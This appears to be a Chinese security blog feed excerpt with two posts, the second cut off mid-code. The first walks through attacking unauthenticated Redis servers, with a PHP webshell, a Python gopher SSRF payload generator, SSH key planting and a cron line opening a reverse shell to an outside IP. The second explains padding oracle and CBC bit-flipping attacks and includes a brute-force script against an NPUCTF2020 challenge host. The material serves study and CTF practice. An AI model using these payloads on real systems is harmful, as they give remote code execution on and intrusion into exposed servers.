    <content type="html"><![CDATA[<p>参考 <a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a></p><p>Redis默认端口6379<br>如果存在未授权问题，那么任何人都可以往这台Redis服务器上传输命令</p><p>一般Redis攻击有<br>写shell（最常用），写密钥，写crontab反弹shell, info获得敏感信息,其中写密钥和写crontab不是那么的好用</p><p>在讲攻击之前，要讲一下RESP协议</p><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>Redis服务器与客户端通过RESP协议的通信。<br>resp协议从redis1.2引入。<br>这个协议把服务器与客户端之间的数据以一种序列化的形式处理并传输</p><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>，发送给服务器的命令就是放在数组中的BulkStrings类型<br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p><p>同时每个类型字节后紧跟着该类型的长度，然后是CRLF，然后是该类型的值</p><p>说了这么多，肯定不会很懂，上图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143000.png" alt="QQ截图20210219143000"></p><p>即发送的时候，是用三个元素的数组(*3),第一个元素是三个长度的BulkString($3)其值为set,第二个元素是四个长度的BulkSting($4)其值为name,第三个元素是四个长度长的BulkString($4)其值为test,服务器返回SimpleString（+）OK，以下类推</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>是http协议出现常用的一个协议，SSRF的万金油。</p><p>格式：gopher://IP:port/_{TCP/IP数据流}</p><h2 id="如何redis远程链接"><a href="#如何redis远程链接" class="headerlink" title="如何redis远程链接"></a>如何redis远程链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip -p port</span><br><span class="line">xxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot;  (未授权就不需要输入密码)</span><br></pre></td></tr></table></figure><h2 id="攻击方法一-写shell"><a href="#攻击方法一-写shell" class="headerlink" title="攻击方法一:写shell"></a>攻击方法一:写shell</h2><p>写shell的话,redis需执行的命令应该类似这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果你能直接redis -h ip -n 6379  未授权连接上redis服务器且权限够高，可以直接输入以下命令</span><br><span class="line">flushall  &#x2F;&#x2F;清空数据库</span><br><span class="line">set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;   &#x2F;&#x2F;为键名为1的键赋值</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php     &#x2F;&#x2F;设置数据存储到磁盘时的文件路径</span><br><span class="line">save    &#x2F;&#x2F;数据库全部保存至磁盘</span><br></pre></td></tr></table></figure><p>攻击脚本如下(主要用于ssrf)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#python3</span><br><span class="line">import urllib</span><br><span class="line">protocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;</span><br><span class="line">ip&#x3D;&quot;192.168.163.128&quot;</span><br><span class="line">port&#x3D;&quot;6379&quot;</span><br><span class="line">shell&#x3D;&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;</span><br><span class="line">passwd&#x3D;&quot;&quot;</span><br><span class="line">cmd&#x3D;[&quot;flushall&quot;,</span><br><span class="line"> &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;这里的IFS替换不是很理解是啥意思..</span><br><span class="line"> &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line"> &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line"> &quot;save&quot;</span><br><span class="line"> ]</span><br><span class="line">if passwd:</span><br><span class="line">cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))   &#x2F;&#x2F;如果需要密码，就把密码输入命令加入到cmd第一位</span><br><span class="line">payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">CRLF&#x3D;&quot;\r\n&quot;</span><br><span class="line">redis_arr &#x3D; arr.split(&quot; &quot;)</span><br><span class="line">cmd&#x3D;&quot;&quot;</span><br><span class="line">cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">for x in redis_arr:</span><br><span class="line">cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">cmd+&#x3D;CRLF</span><br><span class="line">return cmd</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">for x in cmd:</span><br><span class="line">payload +&#x3D; urllib.quote(redis_format(x))</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><p>这样的话，我们就得到了payload，直接curl一下，就写入shell了</p><h2 id="攻击方法二-info获取敏感信息"><a href="#攻击方法二-info获取敏感信息" class="headerlink" title="攻击方法二:info获取敏感信息"></a>攻击方法二:info获取敏感信息</h2><p>连上后 使用info命令</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143019.png" alt="QQ截图20210219143019"></p><h2 id="攻击方法三：写入ssh公钥"><a href="#攻击方法三：写入ssh公钥" class="headerlink" title="攻击方法三：写入ssh公钥"></a>攻击方法三：写入ssh公钥</h2><p>高版本不好用，因为高版本的redis权限是无法往/root目录写入的.<br>而这个方法则需要往/root/.ssh写入ssh公钥达到无密码ssh链接的目的</p><p>首先在攻击机上生成一对不需要密码的公钥私钥</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143031.png" alt="QQ截图20210219143031"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143103.png" alt="QQ截图20210219143103"></p><p>然后依次输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">config set dirfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>然后ssh免密登录 ssh -i id_rsa root@ip</p><h2 id="攻击方法四：利用cron计划任务反弹shell"><a href="#攻击方法四：利用cron计划任务反弹shell" class="headerlink" title="攻击方法四：利用cron计划任务反弹shell"></a>攻击方法四：利用cron计划任务反弹shell</h2><p>仅在centos系统奏效，Ubuntu不行</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令如下</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>把上面那个脚本改改就能实现ssrf了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考 &lt;a href=&quot;https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/&quot;&gt;https://www.redteamin</summary>
      
    
    
    
    
    <category term="杂七杂八的安全问题" scheme="http://yoursite.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Padding oracle Attack与CBC翻转字节攻击.</title>
    <link href="http://yoursite.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/</id>
    <published>2021-02-19T09:21:48.991Z</published>
    <updated>2021-02-19T08:50:36.812Z</updated>
    
    <content type="html"><![CDATA[<p>参考: <a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a><br><a href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p><p>因为是涉及密码学的东西，所以看的我头大，记录一下吧。</p><h2 id="异或（XOR）"><a href="#异或（XOR）" class="headerlink" title="异或（XOR）"></a>异或（XOR）</h2><p>何为异或?<br>异或是一种运算方法，简要概括就是同假异真</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">true xor true &#x3D; false; true xor false &#x3D; true;</span><br><span class="line"></span><br><span class="line">在二进制中:</span><br><span class="line">011 xor 110 &#x3D; 101; 二进制数每位数分别进行xor运算</span><br><span class="line">上面算式的运算步骤是这样的 0 xor 1 &#x3D; 1;1 xor 1 &#x3D; 0;1 xor 0&#x3D;1</span><br><span class="line">然后把运算结果写在一起就是101了</span><br><span class="line"></span><br><span class="line">在更高的进制中:</span><br><span class="line">以十进制为例: 65 xor 42 &#x3D; 107; 原理就是把十进制数字先变为二进制数进行异或，再将异或得到的二进制数结果变为十进制数</span><br><span class="line"></span><br><span class="line">在字符中:</span><br><span class="line">对字符进行异或运算其实就是对字符的ascii码进行异或计算，计算得到的结果视作新的一个ascii码再将其转换为字符。</span><br></pre></td></tr></table></figure><p>xor还有一个性质，就是<br>已知 a xor b = c 那么<br>b xor c =a; a xor c = b.即满足异或运算里只需知道任意两个数就能得到另一个数。</p><h2 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h2><p>CBC是一种加密模型，采用的是分组链接模式。把明文分为一组一组进行加密</p><p><img src="https://image.3001.net/images/20171018/15083333186437.png!small" alt="Padding oracle attack详细解析"></p><p>上图是CBC加密流程。最开始一个特别分组IV去和第一段密文XOR，得到的结果被密钥加密，加密得到该组的密文，同时这个密文会充当最开始的特别分组IV的作用去参与下一组的加密，以此类推。</p><p>CBC的每一个分组的加密结果都可以影响到下一个分组的加密结果， 使原本独立的分组密码加密过程形成迭代 ， 这可以强化加密算法的”敏感性”，即实现所谓的”雪崩效应”，在香浓理论中这就是”扰乱原则” 。</p><p>CBC只是一种模式，它经常把aes或des作为加密使用的算法。 DES分组长度是八字节而AES分组长度是十六字节 。</p><p>接下来是CBC解密</p><p><img src="https://image.3001.net/images/20171018/15083355296698.png!small" alt="Padding oracle attack详细解析"></p><p>顺序依旧是从左到右，第一组密文被KEY解密后与IV xor得到第一组明文，同时第一组密文参与下一组的解密充当IV作用。</p><h2 id="PKCS-5"><a href="#PKCS-5" class="headerlink" title="PKCS #5"></a><strong>PKCS #5</strong></h2><p>竟然CBC模式涉及到分组，那么就会出现最后一组字节没有被占满的情况。<br>比如原本一个分组是8字节，我们有15个字节的明文需要被加密，此时最后一个分组就不会被占满（还差一个字节占满），那么这个时候要怎么办呢？</p><p>这时候就需要对最后一个分组进行填充，将其填充满。<br>对于采用des算法加密的内容，填充规则是PKC #5,而AES是 PKC #7.<br>这两者唯一区别是 PKCS #5填充是八字节分组而PKCS #7是十六字节 ，还记得上面我们说过的 DES分组长度是八字节而AES分组长度是十六字节 吗？就是这个分组字节数影响了填充方式。</p><p>那么具体是怎么填充的呢，我们以PKC #5为例</p><p><img src="https://image.3001.net/images/20171018/15083384721064.png!small" alt="Padding oracle attack详细解析"></p><p>当最后一组还剩n个字节未被填充时，就会填充n个 0xn字符上去.<br>上图是PKCS #5,其实PKCS #7和PKCS #5原理是一样的，不过是分组字节数大了点罢了（0~16）</p><h2 id="Padding-oracle-attack"><a href="#Padding-oracle-attack" class="headerlink" title="Padding oracle attack"></a>Padding oracle attack</h2><p>上面只是铺垫，建议学懂了再来看这个攻击方式。不然会非常头大。</p><h3 id="Padding-oracle-attack-攻击场景举例"><a href="#Padding-oracle-attack-攻击场景举例" class="headerlink" title="Padding oracle attack 攻击场景举例"></a>Padding oracle attack 攻击场景举例</h3><p>首先我们假设一个场景，从而引出这个攻击。</p><p>假设我们有一个任意文件包含场景</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>黑客们看见了就会很轻而易举的去包含想要的文件。管理者发现了这个问题，对file参数采用了CBC加密，即当提交请求时，file参数的值是被加密的，然后服务器用算法解密得到其想包含的文件，然后返回给客户端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?file&#x3D;e28b2e3c972edab8 其中前8位数是IV，后八位数是密文。（这里是我瞎写的密文&#x3D; &#x3D;，你只需要理解到这里是一个CBC加密后的密文就行了）</span><br></pre></td></tr></table></figure><p>那么如何去实现我们的任意文件包含呢? padding oracle attack 出现了。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>假设我们向刚刚那个任意文件包含的提交了一段密文。服务器就会尝试解密，就会出现三种结果。</p><p>1.密文不能正常解密，这种原因是在于最后一组的填充字节出现了错误<br>2.密文能正常解密但解密出来的文件路径不存在<br>3.密文能正常解密且能成功包含</p><p>其中第1种情况和2.3种情况网页返回的内容肯定是不同的。<br>比如说第一种情况可能就直接返回500了，2.3可能就是302跳转啥啥的，通过这个网页返回的信息，我们就有了可乘之机。</p><p>我们先通过一个图感受一下第一组的解密流程</p><p><img src="https://image.3001.net/images/20171019/15083434757270.png!small" alt="Padding oracle attack详细解析"></p><p>好的好的，感受了这个解密流程后，我们来说说攻击的事。<br>如果我们得到了 Intermediary Value(中间值)，并且可以手动修改IV，那么我们岂不是可以构造任意Decrypted Value（明文）了？<br>所以padding oracle attack 的核心就是去获得中间值。<br>那么我们怎么去获取呢？</p><p>还记得刚刚提到的3种情况吗？我们可以通过修改IV，通过判断网页返回内容来判断中间值，具体做法如下:</p><p>我们先把IV全部设置为0x00，然后修改IV的最后一个数，当其与中间值XOR后的值为0x01则此时解密就会成功，若不是0x01解密就会失败，网页会返回不同的内容，以此来判断何时解密成功。然后把解密成功时的IV的最后一位数与0x01进行异或计算，即可得到中间值的最后一位</p><p><img src="https://image.3001.net/images/20171019/15083441758558.png!small" alt="Padding oracle attack详细解析"></p><p>然后我们把IV最后一位数设置为能和中间值最后一位数异或后值为0x02的数，穷举IV倒数第二个数看看哪个数能和中间值倒数第二个数异或运算后值为0x02，然后我们就可得到中间值倒数第二个数，以此类推可以获得第一组的中间值（有点绕）<br>然后破解到了中间值我们再用最开始的IV（不是我们后面构造的IV）去和中间值异或就得到明文了<br>当然，你也可以再次构造IV，从而构造解密出来的字符（通过中间值与IV异或）</p><h2 id="NPUCTF2020-web🐕中的Padding-oracle-Attack"><a href="#NPUCTF2020-web🐕中的Padding-oracle-Attack" class="headerlink" title="[NPUCTF2020]web🐕中的Padding oracle Attack"></a>[NPUCTF2020]web🐕中的Padding oracle Attack</h2><p>我们以这道题为切入点，详细看看如何实现攻击。<br>本题就是以下代码，我们要想方设法先拿到$flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);   # $key,$flag</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);  &#x2F;&#x2F;定义加密方式</span><br><span class="line">define(&quot;SECRET_KEY&quot;, $key);    &#x2F;&#x2F;定义密钥</span><br><span class="line">define(&quot;IV&quot;,&quot;6666666666666666&quot;);    &#x2F;&#x2F;定义初始向量 16个6</span><br><span class="line">define(&quot;BR&quot;,&#39;&lt;br&gt;&#39;);</span><br><span class="line">if(!isset($_GET[&#39;source&#39;]))header(&#39;location:.&#x2F;index.php?source&#x3D;1&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#var_dump($GLOBALS);   &#x2F;&#x2F;听说你想看这个？</span><br><span class="line">function aes_encrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;--------encrypt---------&quot;.BR;</span><br><span class="line">    echo &#39;IV:&#39;.$iv.BR;</span><br><span class="line">    return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line">function aes_decrypt($iv,$data)</span><br><span class="line">&#123;</span><br><span class="line">    return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;); &#x2F;&#x2F;只能返回1或false</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;method&#39;]&#x3D;&#x3D;&#39;encrypt&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; IV;</span><br><span class="line">    $data &#x3D; $flag;    </span><br><span class="line">    echo aes_encrypt($iv,$data);</span><br><span class="line">&#125; else if($_GET[&#39;method&#39;]&#x3D;&#x3D;&quot;decrypt&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    $iv &#x3D; @$_POST[&#39;iv&#39;];</span><br><span class="line">    $data &#x3D; @$_POST[&#39;data&#39;];</span><br><span class="line">    echo aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;我摊牌了，就是懒得写前端&quot;.BR;</span><br><span class="line"></span><br><span class="line">if($_GET[&#39;source&#39;]&#x3D;&#x3D;1)highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们先拿到密文 ly7auKVQCZWum/W/4osuPA==<br>然后对其进行base64解密，发现其刚好是有16个字节，那么我们可以直接穷举IV得到中间值，然后凭此与初始IV（16个6）进行异或得到明文$flag.</p><p>话不多说，爆破中间值的脚本安排上。(借鉴了一个大佬的WP）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">Intermediary&#x3D;&quot;&quot;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;de1650aa-2b24-40e0-bb51-736ff5d38269.node3.buuoj.cn&#x2F;&#x2F;index.php?source&#x3D;1&amp;method&#x3D;decrypt&quot;</span><br><span class="line">iv&#x3D;&quot;&quot;</span><br><span class="line">hexs&#x3D;&quot;&quot;</span><br><span class="line">IV&#x3D;&quot;6666666666666666&quot;</span><br><span class="line">def xor(a,b):</span><br><span class="line">    return &quot;&quot;.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])</span><br><span class="line"></span><br><span class="line">for step in range(1,17):</span><br><span class="line">    padding&#x3D;chr(step)*(step-1)</span><br><span class="line">    print(&quot;第%s轮&quot;%step)</span><br><span class="line">    for i in range(0,256):</span><br><span class="line">        iv&#x3D;chr(0)*(16-step)+chr(i)+xor(Intermediary,padding)</span><br><span class="line">        post&#x3D;&#123;</span><br><span class="line">            &quot;iv&quot;:iv,</span><br><span class="line">            &quot;data&quot;:&quot;ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r&#x3D;requests.post(url&#x3D;url,data&#x3D;post,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        print(r.text+&quot;第%s轮i&#x3D;%s &quot;%(step,i))</span><br><span class="line">        if &quot;False&quot; !&#x3D;  r.text:</span><br><span class="line">            Intermediary&#x3D;xor(chr(i),chr(step))+Intermediary</span><br><span class="line">            print(Intermediary)</span><br><span class="line">            break</span><br><span class="line">for k in range(len(Intermediary)):</span><br><span class="line">    hexs&#x3D;&quot;%&quot;+str(ord(Intermediary[k]))+hexs</span><br><span class="line">print(hexs)</span><br><span class="line">print(xor(Intermediary,IV))</span><br></pre></td></tr></table></figure><p>爆出了中间值和$flag明文</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152650.png" alt="QQ截图20210217152650"></p><p>这里有些疑惑，为啥中间值会是15位的…<br>发现$flag不是最终flag，至于接下来要做的东西，就是CBC字节翻转攻击了</p><h2 id="CBC翻转字节攻击"><a href="#CBC翻转字节攻击" class="headerlink" title="CBC翻转字节攻击"></a>CBC翻转字节攻击</h2><p>在对CBC模式加密的数据进行解密时，若iv可控，则可以任意控制解密后的内容。<br>CBC翻转字节攻击不同于padding oracle attack，后者的核心是IV可控情况下获取中间值，从而可以获得明文或者任意控制密文解密后的数据。<br>而CBC翻转字节攻击的核心思想就不是获取中间值了，而是在IV可控的情况下，通过算法缺陷来直接控制密文解密后的数据。</p><p>现在假定有中间值A,明文B1,IV C1<br>那么就有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A^B1&#x3D;c1</span><br></pre></td></tr></table></figure><p>一点错误都没有对吧。<br>现在又假定有中间值A,我们想要解密出的明文B2和与之对应的IV C2<br>那么就有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A^B2&#x3D;C2</span><br><span class="line">结合以上两个式子，有</span><br><span class="line">A&#x3D;B1^C1&#x3D;B2^C2</span><br><span class="line">于是有</span><br><span class="line">B2&#x3D;B1^C1^C2</span><br><span class="line">或C2&#x3D;B1^B2^C1</span><br><span class="line">若我们已知B1,C1,且C2可控,那么B2即可控</span><br><span class="line">既满足刚刚我们说的，通过算法缺陷来直接控制密文解密后的数据。</span><br></pre></td></tr></table></figure><p>这，就是CBC翻转字节攻击，没太懂没事，看例子就行了</p><h2 id="NPUCTF2020-web🐕中的CBC翻转字节攻击"><a href="#NPUCTF2020-web🐕中的CBC翻转字节攻击" class="headerlink" title="[NPUCTF2020]web🐕中的CBC翻转字节攻击"></a>[NPUCTF2020]web🐕中的CBC翻转字节攻击</h2><p>跟进我们刚刚讲的，FlagIsHere.php,核心代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">X5uucFgPTVdCo9f3ZHGP8g&#x3D;&#x3D;</span><br><span class="line">&lt;?php </span><br><span class="line">#error_reporting(0);</span><br><span class="line">include(&#39;config.php&#39;);    &#x2F;&#x2F;$fl4g</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;6666666&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_iv()&#123;    &#x2F;&#x2F;生成随机初始向量IV</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala &#x3D; &#39;piapiapiapia&#39;;</span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&#39;Identity&#39;]))&#123;</span><br><span class="line">    $_SESSION[&#39;iv&#39;] &#x3D; get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;Identity&#39;] &#x3D; base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode($_SESSION[&#39;iv&#39;]).&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;iv&#39;]))&#123;</span><br><span class="line">    $tmp_id &#x3D; openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;]));</span><br><span class="line">    echo $tmp_id.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    if($tmp_id &#x3D;&#x3D;&#x3D;&#39;weber&#39;)die($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span 